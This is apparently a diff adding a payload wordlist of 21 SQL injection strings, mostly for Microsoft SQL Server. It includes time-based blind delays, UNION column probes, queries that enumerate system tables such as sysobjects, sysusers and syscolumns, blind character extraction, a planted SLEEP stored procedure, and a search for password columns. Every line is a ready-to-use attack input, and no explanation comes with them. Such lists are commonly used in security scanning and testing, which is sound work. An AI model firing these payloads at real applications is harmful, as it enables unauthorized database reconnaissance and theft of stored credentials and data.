@@ -1,0 +1,21 @@
+1 WAITFOR DELAY '0:0:10'
+1; WAITFOR DELAY '0:0:10'--
+IF 1=1 WAITFOR DELAY '0:0:10'
+1 AND BENCHMARK(100000000,MD5(1))
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+1 AND 1=(SELECT COUNT(*) FROM sysobjects)
+1; SELECT COUNT(*) FROM sysobjects;
+1 OR 1=(SELECT COUNT(*) FROM sysusers)
+1 UNION ALL SELECT NULL FROM sysobjects
+1 AND (SELECT COUNT(*) FROM sysobjects so, sysusers su, sysprocesses sp) > 0
+1; CREATE PROCEDURE SLEEP(@seconds INT) AS BEGIN DECLARE @start DATETIME, @finish DATETIME SELECT @start = GETDATE() SELECT @finish = DATEADD(second, @seconds, @start) WHILE GETDATE() < @finish WAITFOR DELAY '00:00:00.001' END;--
+EXEC SLEEP 10;
+1 AND ASCII(SUBSTRING((SELECT name FROM sysobjects WHERE id=1),1,1)) > 70
+1 OR EXISTS(SELECT 1 FROM sysobjects WHERE name='users')
+1 AND (SELECT COUNT(*) FROM syscolumns WHERE id=1) > 5
+1 UNION SELECT DISTINCT name FROM sysobjects
+1; SELECT @@version;
+1 AND (SELECT hex(substring(name,1,1)) FROM sysobjects WHERE id=1)='74'
+1 OR (SELECT COUNT(*) FROM sysobjects)=(SELECT COUNT(*) FROM sysobjects)
+1 AND (SELECT COUNT(*) FROM syscolumns WHERE name LIKE '%password%') > 0
+1 UNION ALL SELECT NULL, NULL, NULL FROM master..sysprocesses--
